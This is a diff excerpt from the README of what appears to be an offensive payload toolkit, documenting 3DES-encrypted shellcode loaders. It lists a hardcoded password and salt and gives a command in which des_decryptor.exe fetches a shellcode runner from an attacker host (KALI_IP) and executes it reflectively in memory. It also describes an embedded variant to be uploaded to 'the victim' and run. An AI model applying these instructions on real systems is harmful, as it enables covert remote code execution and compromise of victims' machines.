@@ -106,14 +106,14 @@ The 3DES payloads are located under ```payloads/3DES/``` directory. There are tw
 - **Password**: oqphnbt0kuedizy4m3avx6r5lf21jc8s
 - **Salt**: vh9b4tsxrl1560wg8nda2meuc7yjzop3
 
-#### 1.1.1 Method 1
+#### 1.1.1 Method 1 (Needs the path of Shellcode Runner)
 The executable **des_decryptor.exe** is downloading the file from your Web server and executes it reflectively.
 
 ```
 cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
 ```
 
-#### 1.1.2 Method 2
+#### 1.1.2 Method 2 (Embeds the Shellcode Runner)
 The executable ```des_decryptor_embeded.exe``` embedds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. Upload the file to the victim and execute it.
 
 ```
